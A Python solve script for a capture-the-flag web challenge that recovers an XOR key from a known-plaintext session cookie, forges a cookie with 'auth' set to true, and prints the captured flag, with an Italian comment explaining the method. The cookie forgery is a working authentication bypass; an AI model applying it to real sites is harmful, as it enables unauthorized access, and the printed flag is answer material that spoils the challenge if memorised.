import requests
import re
import base64

def xor(data, key):
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

site = "http://baked.challs.olicyber.it"
key = "SEGR3T0"

plain = b'{"theme":{"background":"public/christmas.jpg","color":"red"},"auth":true}'
new_cookie = (base64.b64encode(xor(plain, b"SEGR3T0"))).decode() #KGczOlY5VXF/PHBRNVM4IjU9RjpUcX9lIkY2XDomaDFbJlkgMSozQHpaIyJlfhE3Xz8qNXAJdkI2IWUvH3ZRJjEvcAkgQiYgOg==
#possiamo ricavare la key SEGR3TO facendo lo xor tra il cookie di sessione (cifrato) e il plaintext che conosciamo, ci basta poi cambiare auth in true e ricifrarlo per ottenere un cookie valido

r = requests.get(f"{site}/?theme=christmas", cookies={"session":"KGczOlY5VXF/PHBRNVM4IjU9RjpUcX9lIkY2XDomaDFbJlkgMSozQHpaIyJlfhE3Xz8qNXAJdkI2IWUvH3ZRJjEvcAkgQiYgOg=="}).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{i_s3gret1_n0n_son0_p3r_s3mpr3}